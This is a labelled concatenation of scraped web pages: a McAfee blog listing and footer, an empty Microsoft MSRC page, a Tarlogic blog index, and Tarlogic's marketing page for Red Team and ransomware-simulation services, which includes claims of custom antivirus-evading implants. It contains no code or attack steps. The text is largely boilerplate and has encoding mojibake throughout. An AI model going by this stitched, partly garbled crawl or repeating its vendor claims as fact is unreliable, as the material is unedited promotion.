##### [How to Be Your Family‚Äôs Digital IT Hero for the Holidays](https://www.mcafee.com/blogs/family-safety/how-to-be-your-familys-digital-it-hero-for-the-holidays/%20 "How to Be Your Family‚Äôs Digital IT Hero for the Holidays")

The holiday season often brings a rush of new gadgets‚Äîsmartphones, tablets, laptops, and smart home devices‚Äîinto households....

Nov 18, 2024  ¬†¬†|¬†¬†    6  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/10/300x200_Blog_103024.png)](https://www.mcafee.com/blogs/tips-tricks/how-ai-pcs-are-optimizing-productivity-tools-for-students/%20 "How AI PCs Are Optimizing Productivity Tools for Students")

##### [How AI PCs Are Optimizing Productivity Tools for Students](https://www.mcafee.com/blogs/tips-tricks/how-ai-pcs-are-optimizing-productivity-tools-for-students/%20 "How AI PCs Are Optimizing Productivity Tools for Students")

In today‚Äôs fast-paced educational environment, productivity is a key determinant of academic success. Enter AI PCs‚Äîcomputers enhanced...

Oct 30, 2024  ¬†¬†|¬†¬†    5  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2013/04/300x200_Blog_101024.png)](https://www.mcafee.com/blogs/internet-security/malware/%20 "What is Malware?")

##### [What is Malware?](https://www.mcafee.com/blogs/internet-security/malware/%20 "What is Malware?")

What is malware? A dictionary-like definition is ‚Äúmalicious software that attacks computers, smartphones, and other connected devices.‚Äù...

Oct 16, 2024  ¬†¬†|¬†¬†    7  MIN READ

### [Internet Security](https://www.mcafee.com/blogs/internet-security/)

[see all
![Arrow symbol](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/arrow-img.svg)](https://www.mcafee.com/blogs/internet-security/)

[![](https://www.mcafee.com/blogs/wp-content/uploads/2021/08/300x200_Gaming.jpg)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/githubs-dark-side-unveiling-malware-disguised-as-cracks-hacks-and-crypto-tools/%20 "GitHub‚Äôs Dark Side: Unveiling Malware Disguised as Cracks, Hacks, and Crypto Tools")

##### [GitHub‚Äôs Dark Side: Unveiling Malware Disguised as Cracks, Hacks, and Crypto Tools](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/githubs-dark-side-unveiling-malware-disguised-as-cracks-hacks-and-crypto-tools/%20 "GitHub‚Äôs Dark Side: Unveiling Malware Disguised as Cracks, Hacks, and Crypto Tools")

Authored by Aayush Tyagi Video game hacks, cracked software, and free crypto tools remain popular bait for...

Jan 24, 2025  ¬†¬†|¬†¬†    8  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2024/05/355x200_Blog_Voting-300x169.png)](https://www.mcafee.com/blogs/internet-security/from-election-day-to-inauguration-how-cybersecurity-safeguards-democracy/%20 "From Election Day to Inauguration: How Cybersecurity Safeguards Democracy")

##### [From Election Day to Inauguration: How Cybersecurity Safeguards Democracy](https://www.mcafee.com/blogs/internet-security/from-election-day-to-inauguration-how-cybersecurity-safeguards-democracy/%20 "From Election Day to Inauguration: How Cybersecurity Safeguards Democracy")

Inauguration Day has come and gone, and the peaceful transfer of power couldn‚Äôt have happened without the...

Jan 21, 2025  ¬†¬†|¬†¬†    3  MIN READ

[![](https://www.mcafee.com/blogs/wp-content/uploads/2025/01/Brad-Pitt-Romance-Scam-3-287x300.jpg)](https://www.mcafee.com/blogs/internet-security/brad-pitt-romance-scam-explained-how-to-prevent-scams/%20 "Breaking Down the Brad Pitt Scam: How it Happened and What We Can Learn¬†")

##### [Breaking Down the Brad Pitt Scam: How it Happened and What We Can Learn](https://www.mcafee.com/blogs/internet-security/brad-pitt-romance-scam-explained-how-to-prevent-scams/%20 "Breaking Down the Brad Pitt Scam: How it Happened and What We Can Learn¬†")

Romance scams have surged in sophistication, preying on emotions and exploiting the trust of victims in the...

Jan 21, 2025  ¬†¬†|¬†¬†    5  MIN READ

* Follow Us

[![Facebook](/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/Facebook.svg)](https://www.facebook.com/mcafee "Facebook")[![Twitter](/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/Twitter.svg)](https://twitter.com/mcafee "Twitter")[![Instagram](/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/Instagram.svg)](https://www.instagram.com/mcafee/?hl=en "Instagram")[![LinkedIn](/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/LinkedIN.svg)](https://www.linkedin.com/company/mcafee?trk=prof-exp-company-name "LinkedIn")[![YouTube](/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/Youtube.svg)](https://www.youtube.com/user/mcafee "YouTube")[![RSS](/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/RSS.svg)](/blogs/feed/ "RSS")

* Trending Articles
* ###### [How to Protect Yourself from a Brushing Scam](https://www.mcafee.com/blogs/tips-tricks/how-to-protect-yourself-from-a-brushing-scam/ "How to Protect Yourself from a Brushing Scam")

  Dec 21, 2024 ¬†¬†|¬†¬†   5  MIN READ
* ###### [How to Be Your Family‚Äôs Digital IT Hero for the Holidays](https://www.mcafee.com/blogs/family-safety/how-to-be-your-familys-digital-it-hero-for-the-holidays/ "How to Be Your Family‚Äôs Digital IT Hero for the Holidays")

  Nov 18, 2024 ¬†¬†|¬†¬†   6  MIN READ
* ###### [This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers](https://www.mcafee.com/blogs/privacy-identity-protection/holiday-season-tricks-survey-us/ "This Holiday Season, Watch Out for These Cyber-Grinch Tricks Used to Scam Holiday Shoppers")

  Dec 11, 2024 ¬†¬†|¬†¬†   7  MIN READ

![McAfee logo](https://www.mcafee.com/blogs/wp-content/uploads/2021/08/mcafeeredlogo-1.png)

[Back to top](#wrapper)

---

![](https://media.mcafeeassets.com/content/dam/npcld/ecommerce/en/company-logo/McAfeeHzRed.svg "McAfee Company Logo")
Corporate
Headquarters
 6220 America Center
Drive
 San Jose, CA 95002
USA

Products

[McAfee+‚Ñ¢
Individual](/en-us/identity-theft/protection.html)
[McAfee+‚Ñ¢
Family](/en-us/identity-theft/family.html)
[McAfee¬Æ Total
Protection](/en-us/antivirus/mcafee-total-protection.html)
[McAfee¬Æ
Antivirus](/en-us/antivirus.html)
[McAfee¬Æ Safe
Connect](/en-us/vpn.html)
[McAfee¬Æ PC
Optimizer](/en-us/consumer-support/pc-optimizer.html)
[McAfee¬Æ
TechMaster](/en-us/products/techmaster.html)
[McAfee¬Æ Mobile
Security](/en-us/antivirus/mobile.html)

Resources

[Antivirus](/en-us/antivirus.html)
[Free
Downloads](/en-us/antivirus/free.html)
[Parental
Controls](/en-us/parental-controls.html)
[Malware](/en-us/antivirus/malware.html)

[Firewall](/en-us/antivirus/firewall.html)
[Blogs](https://www.mcafee.com/blogs/)
[Activate
Retail Card](/en-us/consumer-support/activate-product-key.html)
[McAfee
Labs](/en-us/consumer-corporate/mcafee-labs.html)

Support

[Customer
Service](https://www.mcafee.com/support)
[FAQs](/en-us/consumer-support/help/common-faq.html)
[Renewals](/content/consumer/en-us/external-link/my-account/my-account.html)
[Support

 Community](https://forums.mcafee.com/)

About

[About
McAfee](/en-us/consumer-corporate/about.html)
[Careers](https://careers.mcafee.com/)
[Contact
Us](/en-us/consumer-corporate/contact-us.html)
[Newsroom](/en-us/consumer-corporate/newsroom.html)
[Investors](/en-us/consumer-corporate/investors.html)
[Legal
Terms](/en-us/consumer-support/policy/legal.html#webtos)
[Your
Privacy Choices¬†![California Consumer Privacy Act (CCPA) Opt-Out Icon](https://media.mcafeeassets.com/content/dam/npcld/ecommerce/en-us/icons/privacy-options.svg)](/en-us/consumer-support/policy/legal.html)
[System
Requirements](/en-us/consumer-support/help/system-requirement.html)
[Sitemap](/en-us/consumer/site-map.html)

---

United States / English Copyright ¬© 2024
McAfee, LLC
Copyright ¬© 2024 McAfee, LLC

United
States / English

![Back to top](https://www.mcafee.com/blogs/wp-content/themes/securingtomorrow-brillio/img/new-icons/backtotop.png)

![Facebook pixel](https://www.facebook.com/tr?id=448732493334171&ev=PageView&noscript=1)

![Facebook pixel](https://www.facebook.com/tr?id=187610925152304&ev=PageView&noscript=1)

![](https://dc.ads.linkedin.com/collect/?pid=68395&fmt=gif)



=== Content from portal.msrc.microsoft.com_223ab3d7_20250126_040731.html ===
You need to enable JavaScript to run this app.

=== Content from www.tarlogic.com_e5b2cd13_20250126_040721.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24√ó7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/blog/ "EN")
  + [ES](https://www.tarlogic.com/es/blog/ "ES")

* EN
  + [ES](https://www.tarlogic.com/es/blog/)

![](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blog_blur.webp)

# Cybersecurity Blog

Discover Tarlogic's latest Cybersecurity and cyberintelligence researchs

[Home](https://www.tarlogic.com)
/
Cybersecurity Blog

### Cybersecurity

[cybersecurity blog](https://www.tarlogic.com/blog/category/cybersecurity/)

![](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/blackarrow-blog-shield.png)
### BlackArrow

[BlackArrow blog](https://www.tarlogic.com/blog/category/blackarrow/)

![](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/cyberintelligence-blog-shield.png)
### CyberIntelligence

[cyberintelligence blog](https://www.tarlogic.com/blog/category/cyberintelligence/)

![](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/cyber4all-blog-shield.png)
### Cyber for all

[cyber for all blog](https://www.tarlogic.com/blog/category/cyber-for-all/)

All posts

[![How will the Cybersecurity Coordination and Governance Act affect businesses?](data:image/gif;base64...)](https://www.tarlogic.com/blog/cybersecurity-coordination-and-governance-act/)
###### [How will the Cybersecurity Coordination and Governance Act affect businesses?](https://www.tarlogic.com/blog/cybersecurity-coordination-and-governance-act/)

23 - January - 2025
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/cybersecurity-coordination-and-governance-act/)

[![How to report a vulnerability in software securely](data:image/gif;base64...)](https://www.tarlogic.com/blog/how-report-vulnerability-software/)
###### [How to report a vulnerability in software securely](https://www.tarlogic.com/blog/how-report-vulnerability-software/)

14 - January - 2025
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/how-report-vulnerability-software/)

[![Red Team vs Blue Team: differences between two strategies to protect your business](data:image/gif;base64...)](https://www.tarlogic.com/blog/red-team-vs-blue-team-differences-benefits/)
###### [Red Team vs Blue Team: differences between two strategies to protect your business](https://www.tarlogic.com/blog/red-team-vs-blue-team-differences-benefits/)

20 - December - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/red-team-vs-blue-team-differences-benefits/)

[![CVE-2024-53677: Critical vulnerability affecting Apache Struts](data:image/gif;base64...)](https://www.tarlogic.com/blog/cve-2024-53677-vulnerability-apache-struts/)
###### [CVE-2024-53677: Critical vulnerability affecting Apache Struts](https://www.tarlogic.com/blog/cve-2024-53677-vulnerability-apache-struts/)

19 - December - 2024
S.T.A¬≤.R.S Team

[Read more](https://www.tarlogic.com/blog/cve-2024-53677-vulnerability-apache-struts/)

[![CRA Regulation: Increasing the security of the software and hardware we use](data:image/gif;base64...)](https://www.tarlogic.com/blog/cra-regulation/)
###### [CRA Regulation: Increasing the security of the software and hardware we use](https://www.tarlogic.com/blog/cra-regulation/)

16 - December - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/cra-regulation/)

[![What are the characteristics of a truly secure website?](data:image/gif;base64...)](https://www.tarlogic.com/blog/characteristics-secure-website/)
###### [What are the characteristics of a truly secure website?](https://www.tarlogic.com/blog/characteristics-secure-website/)

03 - December - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/characteristics-secure-website/)

[![CVE-2024-52316: Critical vulnerability in Apache Tomcat](data:image/gif;base64...)](https://www.tarlogic.com/blog/cve-2024-52316-apache-tomcat/)
###### [CVE-2024-52316: Critical vulnerability in Apache Tomcat](https://www.tarlogic.com/blog/cve-2024-52316-apache-tomcat/)

26 - November - 2024
S.T.A¬≤.R.S Team

[Read more](https://www.tarlogic.com/blog/cve-2024-52316-apache-tomcat/)

[![How to report a security breach involving a personal data breach](data:image/gif;base64...)](https://www.tarlogic.com/blog/how-to-report-personal-data-security-breach/)
###### [How to report a security breach involving a personal data breach](https://www.tarlogic.com/blog/how-to-report-personal-data-security-breach/)

26 - November - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/how-to-report-personal-data-security-breach/)

[![These are the most common security breaches in mobile applications in the Play Store and App Store](data:image/gif;base64...)](https://www.tarlogic.com/blog/security-breaches-in-mobile-applications/)
###### [These are the most common security breaches in mobile applications in the Play Store and App Store](https://www.tarlogic.com/blog/security-breaches-in-mobile-applications/)

19 - November - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/security-breaches-in-mobile-applications/)

[![10 tips to avoid cyber-attacks on Black Friday](data:image/gif;base64...)](https://www.tarlogic.com/blog/cyber-attacks-black-friday/)
###### [10 tips to avoid cyber-attacks on Black Friday](https://www.tarlogic.com/blog/cyber-attacks-black-friday/)

18 - November - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/cyber-attacks-black-friday/)

[![Clickbait scams: Curiosity swindled the cat](data:image/gif;base64...)](https://www.tarlogic.com/blog/clickbait-scams/)
###### [Clickbait scams: Curiosity swindled the cat](https://www.tarlogic.com/blog/clickbait-scams/)

13 - November - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/clickbait-scams/)

[![This is how company employees usually ‚Äústing‚Äù in Red Team exercises](data:image/gif;base64...)](https://www.tarlogic.com/blog/red-team-most-common-mistakes-emplotees/)
###### [This is how company employees usually ‚Äústing‚Äù in Red Team exercises](https://www.tarlogic.com/blog/red-team-most-common-mistakes-emplotees/)

12 - November - 2024
Ciber 4 All Team

[Read more](https://www.tarlogic.com/blog/red-team-most-common-mistakes-emplotees/)

1
[2](https://www.tarlogic.com/blog/page/2/)
[3](https://www.tarlogic.com/blog/page/3/)
[4](https://www.tarlogic.com/blog/page/4/)
‚Ä¶
[25](https://www.tarlogic.com/blog/page/25/)
[>](https://www.tarlogic.com/blog/page/2/)

###### [Discover Tarlogic's Cybersecurity Services](https://www.tarlogic.com/cybersecurity-services/)

## How can we help you?

Contact our cybersecurity team for any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

![world](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/tarlogic-cybersecurity-company-footer_blur.webp)

###### BUSINESS UNITS

* [CYBERSECURITY](https://www.tarlogic.com/cybersecurity-services/ "CYBERSECURITY SERVICES")
* [CYBER INTELLIGENCE](https://www.tarlogic.com/cyber-intelligence/ "CYBER INTELLIGENCE SERVICES")
* [BLACKARROW](https://www.tarlogic.com/blackarrow/ "BLACKARROW SERVICES")

###### CONTACT INFO

[EUROPE HQ:
Madrid
 Quintanavides 13-23,
 Business Park V√≠a Norte 2nd building,
 Las Tablas, 28050](https://www.google.com/maps?cid=15171011320439567448)
 (+34) 912 919 319

 contact@tarlogic.com

###### LINKS

* [Cybersecurity Products](https://www.tarlogic.com/cybersecurity-products/)
* [Cybersecurity Careers](https://www.tarlogic.com/cybersecurity-jobs-careers/)
* [Cybersecurity Glossary](https://www.tarlogic.com/cybersecurity-glossary/)
* [Tarlogic News](https://www.tarlogic.com/news/)
* [Cybersecurity company (About us)](https://www.tarlogic.com/about-tarlogic/)
* [BSAM Bluetooth Security Methodology](https://www.tarlogic.com/bsam/)
* [Sectors](https://www.tarlogic.com/sectors/)
* [Partner Channel](https://www.tarlogic.com/partners/)

¬© 2025 all rights reserved Tarlogic | Cyber security and Cyber intelligence experts

[Privacy policy](https://www.tarlogic.com/privacy-policy/) - [Legal notice](https://www.tarlogic.com/legal-notice/) - [Management policy](https://www.tarlogic.com/management-policy/) - [Cookies policy](https://www.tarlogic.com/cookies-policy/) - [Whistle-blower channel](https://tarlogic-security.factorialhr.es/complaints)

We are using cookies to give you the best experience on our website. You can find out more about which cookies we are using or switch them off in Cookies Settings

I agree

###### Necessary

Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.

Necessary cookies
###### 3rd Party Cookies

This website uses Google Analytics to collect anonymous information such as the number of visitors to the site, and the most popular pages.
Keeping this cookie enabled helps us to improve our website.

3rd party cookies

Enable all
Save settings
[Cookies policy](https://www.tarlogic.com/cookies-policy/)

[Contact us now üí¨](#top)



=== Content from www.tarlogic.com_36c4ff12_20250126_040723.html ===


* [Home](/)
* [Services](https://www.tarlogic.com/cybersecurity-services/)
  + Advanced penetration testing services
    - [Red Team services](https://www.tarlogic.com/red-team-services/)
    - [External & internal pentesting](https://www.tarlogic.com/penetration-testing-services/ "Penetration Testing services")
    - [Social Engineering](https://www.tarlogic.com/social-engineering/)
    - [Wi-Fi Pentest](https://www.tarlogic.com/wifi-pentest/)
    - Cyber intelligence services
    - [Threat Intelligence](https://www.tarlogic.com/threat-intelligence/)
    - [Digital surveillance](https://www.tarlogic.com/digital-surveillance/)
    - [Fraud investigation and analysis](https://www.tarlogic.com/fraud-investigation/ "Fraud investigation ")
    - [Strategic Cyber-Intelligence](https://www.tarlogic.com/strategic-cyber-intelligence/ "Strategic Cyber Intelligence")
  + Security assessment services
    - [Web Security Audit](https://www.tarlogic.com/website-security-audit/ "Website security audit")
    - [Mobile Application Security Test Audit](https://www.tarlogic.com/mobile-app-audit/ "Mobile application security audits")
    - [IOT Security testing](https://www.tarlogic.com/iot-security-testing/ "IoT Security assessment")
    - [Cloud Infrastructures security audit](https://www.tarlogic.com/cloud-security-assessment/ "Cloud security assessment")
    - [Reverse Engineering & Hardware Hacking](https://www.tarlogic.com/hardware-hacking-and-reverse-engineering-services/ "Reverse Engineering")
    - [Code Security Audit](https://www.tarlogic.com/code-security-audit/)
    - [Technologies and Operating Systems Hardening](https://www.tarlogic.com/operating-system-hardening/ "Hardening")
    - [Advanced Bank Infrastructures Security Assessment](https://www.tarlogic.com/advanced-bank-security-assessment/ "Bank Infrastructures Security Assessment")
  + Attack Surface Reduction services
    - [Vulnerability Management](https://www.tarlogic.com/vulnerability-management/ "Vulnerability management service")
    - [Emerging vulnerabilities 24√ó7](https://www.tarlogic.com/emerging-vulnerabilities/ "Emerging vulnerability management service")
    - [Denial of service simulation (DoS)](https://www.tarlogic.com/dos-test/ "Denial of service test")
    - [Managed Bug Bounty program](https://www.tarlogic.com/bug-bounty/ "Bug bounty service")
    - [Dynamic Risk Assessment and Threat Prioritization](https://www.tarlogic.com/threat-priorization/ "Threat Priorization")
    - Protection and response
    - [Threat Hunting services](https://www.tarlogic.com/threat-hunting/ "Threat Hunting")
    - [Incident Response Services](https://www.tarlogic.com/incident-response/ "Incident Response")
* [BlackArrow](https://www.tarlogic.com/blackarrow/)
* [Blog](https://www.tarlogic.com/blog/)
* [Contact](https://www.tarlogic.com/contact/ "Contactar con tarlogic")
* [EN](https://www.tarlogic.com/red-team-services/ "EN")
  + [ES](https://www.tarlogic.com/es/servicios-red-team/ "ES")
  + [IT](https://www.tarlogic.com/it/servizi-red-team/ "IT")

* EN
  + [ES](https://www.tarlogic.com/es/servicios-red-team/)
  + [IT](https://www.tarlogic.com/it/servizi-red-team/)

![Red Team services](https://www.tarlogic.com/wp-content/themes/Avada-Child-Theme/images/red-team-blur.webp)

# Red Team services

Our Red Team cybersecurity service goes beyond traditional audits.

We simulate real-world attacks, performed by ethical hackers, to assess the resilience of your infrastructure. We infiltrate your systems just as cybercriminals would, but with a single, clear objective: to uncover your vulnerabilities before real attackers do.

Fill in the form and we will call you back

Your name \*

Your company's name \*

Company size

1 / I'm not a company
< 50
51-200
201-800
801-1500
> 1500

Email address \*

Phone (optional)

Message

Accept our data protection policy ([link](https://www.tarlogic.com/privacy-policy/))

![blackarrow logo](/wp-content/themes/Avada-Child-Theme/images/LOGO_BLACKARROW_white.svg)

[Home](https://www.tarlogic.com)
/
[BlackArrow ‚Äì Offensive security services](https://www.tarlogic.com/blackarrow/)
/
Red Team services

## Red Teaming Services

The mission of the **Red Team** in cybersecurity is to simulate a sponsored external agent performing unauthorized access to corporate systems. This involves not only classic intrusion but also long-term persistence, privilege escalation within corporate systems, and even the alteration and theft of strategic business information.

During their execution, **Red Team services** continuously assess the detection and response capabilities of the security team (**Blue Team**), simulating the actions of a hostile actor and testing defenses against a real attack.

Attack scenarios can be designed and guided by threat intelligence (TLPT), as defined by the **TIBER** and **DORA** framework, providing these exercises with increased realism.

## Benefits of Red Team services

**Red Team services** help detect and contain a **penetration event at an early stage** which results in preventing strategic information theft and corporate system down-time. This goal is gradually achieved thanks to:

### Detection of the company‚Äôs transversal weaknesses.

* Verifies the real impact of a cyberattack against your company by executing offensive cybersecurity exercises led by a threat intelligence team.

### Improvement and strengthening of response procedures

* Helps rapidly evolve the capabilities of the defensive team, allowing them to more effectively combat real situations they may potentially face in the future.

### Improvement of monitoring systems

* Reveals which suspicious activities have not been detected by monitoring systems, identifying and resolving weaknesses in the event detection and analysis process.

### Training of security personnel

* Trains security personnel to respond to real incidents by thoroughly analyzing the intrusion in joint working sessions between the offensive and defensive teams.

## Looking for Red Teaming services?

Contact our cybersecurity team if you have any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

]
![red teaming services](data:image/gif;base64...)

## How the Red Team Service is Carried Out

The BlackArrow team designs a complete attack scenario, defining the starting point and milestones to achieve during the intrusion execution, and carries it out without the knowledge of the company's cybersecurity team.

* **Asset Identification:** We discover and map assets, applications, and technologies used.
* **Simulation of Real Attacks:** We identify high-impact vulnerabilities and test them to see how the defenses would respond to different types of threats.
* **Continuous Improvement:** We not only detect failures but also offer specific solutions to strengthen security as we advance in intrusion and persistence within the network.
* **Regulatory Adaptation:** We help your company comply with industry-required regulations and security standards, enhancing its cyber resilience.

From Perimeter Breach to Ransomware Simulation

## Red Team Scenarios

**Red Team Scenarios** mimic threat actors like Remote Attackers, Malicious Employees or Ransomware Simulation among others.

Companies are continuously exposed to threat actors or adversaries that can introduce risks in several ways. According to that context, our Red Team simulates threat actors or adversaries looking for a particular objective. That is what it is called a Red Team Scenario.

The following table illustrates some alternatives that could be used to define the most suitable Red Team Scenario for a particular exercise:

Threat Actors

* Remote attacker
* Compromised Third Party or collaborator
* Compromised or disgruntled employee
* Competitors
* Activist / Terrorist
* Any other threat actors to be agree with our Clients

Intrusion vectors

* Vulnerability exploitation
* Social Engineering (including phishing)
* Password guessing
* WiFi or Ethernet
* Remote Access or VPN
* Leaked information (including user accounts)

Objectives

* Privilege escalation
* Targeted compromise (ERP, Treasury, OT, SCADA)
* Deploy Ransomware
* Leak sensitive information
* Leak/manipulate/sabotage products (software, patents)
* Force payments
* Any other objective to be agreed with our Clients

![red team scenarios](data:image/gif;base64...)

## Red team scenarios examples

In fact, like a real threat actor, **Red Teaming services** can simulate multiple scenarios to maximize success.

By choosing the most relevant Threat Actors and Objectives, it is possible to define particular **Red Teaming Scenarios** that can be found in a real environment. The following scenarios are only representative examples of what it can be found in a real environment:

* A **competitor** using a **leaked user account** to access **sensitive information** (**patents**)
* An **activist** trying to exploit a vulnerability to access **SCADA** infrastructure and perform **sabotage** activities
* A **disgruntled employee** collaborating to perform a malicious **payment to a third party account**
* A **partner** accessing corporate services, leads to a major compromise of **deploying ransomware**

## Ransomware simulation

This list is endless, and any realistic scenario could be reproduced as a Red Team Scenario

It is important to note that Red Teaming is much more than a Red Team scenario, but **Ransomware Simulation exercises**have gained some attention in the last few months. As ransomware attacks are becoming more frequent and sophisticated, organizations are increasing their effort to face any potential ransomware attack. Frequent questions clients ask us:

* Is my organization prepared to face a ransomware attack?
* Would my defensive layers identify, contain and recover from a targeted ransomware attack?
* Does my organization have experience to learn from other ransomware attacks and learn lessons from that experience?

![ransomware simulation test](data:image/gif;base64...)

![red team cyber security exercises](data:image/gif;base64...)

## Resilience in front of a ransomware attack

In the case that some of your answers were ‚Äúno‚Äù, you may consider performing a Red Team Scenario focused on **Ransomware** Simulation exercises. In the particular case of Ransomware **Simulation exercises** we suggest two differentiated stages:

1. **Red Team Scenario**: Performing activities included in a Ransomware Simulation exercise by replicating a realistic targeted ransomware attack.
2. **Gap-Analysis**.: One **advisor** analyzes how our client defensive layers have detected, contained and recovered assets during the Red Team Scenario identifying improvement possibilities you can implement.

## Looking for Red Teaming services?

Contact our cybersecurity team if you have any questions or if you are in need of an assessment!

[Contact](https://www.tarlogic.com/contact/)

## Why is our service different?

Our Red Team exclusively performs Red Team exercises. It simulates threat actors or adversaries with the objective of obtaining unauthorized access to corporate assets, and we work hand in hand with our Threat Hunting and Threat Intelligence teams to improve our capabilities.

![red team labs](data:image/gif;base64...)

### RED TEAM LABS

#### From 0 day to exploit

* Analysis of company technologies.
* Advanced vulnerability testing on company technologies.
* Targeted 0-days.
* Targeted exploits.

![red team intelligence](data:image/gif;base64...)

### RED TEAM INTEL

#### Continuous reconnaissance

* Reconnaissance activities on public information.
* Identification of infrastructure, services, applications, and potential leaks.
* Inventory maintenance to map technologies with new vulnerabilities as they are published.

![red team apt](data:image/gif;base64...)

### PERSISTENCE

#### Proprietary APTs

* Our Red Team develops its own custom APTs (for Windows and Linux), which, in addition to being undetectable by antivirus, have advanced techniques to allow persistence and remote control.

![red team experts](data:image/gif;base64...)

### WORLD-CLASS TEAM

#### Cutting-edge experts

* Multiple vulnerabilities reported and accredited in widely used software, as well as active participants in the CTF community (first place in European events). Recognition in reputed "full disclosure" programs.

## Red team FAQs

### What is a Red Team exercise?

A Red Team exercise is the design and execution of an offensive operation aimed to **simulate a certain Malicious Actor.** This can verify the organization‚Äôs defensive layers and identify not only high/critical risk vulnerabilities but also **testing the real detection and response capabilities** provided by the organization.

### What is the difference between pentesting and red teaming?

While a [penetration test](https://www.tarlogic.com/penetration-testing-services/)¬†usually is constrained to a particular scope and focuses mainly on vulnerabilities, **a red team service should not have a limited scope** but at the same time maintain focus on resilience rather than on vulnerabilities.

Under that context the outcome of a red team exercise should be a representation about how well an organization is prepared to face a certain Malicious Actor.

### How long does it take to conduct a red teaming service?

It depends on the designed exercise. Typically, an exercise without any previous information about an organization, could take a **minimum of 3 months** to obtain results. This however will represent the real situation of the defensive layers. Meanwhile other exercises starting with a certain level of access to internal resources could require less time.

Mature organizations tend to hire continuous red teaming operations, allowing them to perform **several exercises during the year**.

### Could a red team service cause any damage or disruption?

As any other offensive service, a red team exercise could lead to undesirable situations including damage or disruption. That is the reason why risk management is a key component of Red Teaming, including not only an **extremely experienced and accurated team** but also insurance policies to be covered for those unexpected situations.

### How does a red team versus blue team exercise help an organization?

During a Red Team exercise Blue Team technology, procedures and people can be trained to test if the defensive layers are working as expected.

Once a **Red Team** exercise has been completed, establishing working sessions with the Blue Team can help organizations to identify areas of improvement as well as sharing experiences to be prepared in the future.

## Other services

### Advanced penetration testing services

* [![Red Team service](data:image/gif;base64... "Red team services")
  #### Red Team services](https://www.tarlogic.com/red-team-services/ "Red team services")
* [![penetration testing services](data:image/gif;base64... "penetration testing services")
  #### Penetration testing services ‚Äì Advanced pentesting](https://www.tarlogic.com/penetration-testing-services/ "penetration testing services")
* [![Social Engineering services](data:image/gif;base64... "Social Engineering")
  #### Social Engineering services](https://www.tarlogic.com/social-engineering/ "Social Engineering")
* [![Wireless security assessment](data:image/gif;base64... "Wi-Fi pentest")
  #### Wi-Fi Pentest ‚Äì Wireless security assessment](https://www.tarlogic.com/wifi-pentest/ "Wi-Fi pentest")

### Cyber intelligence services

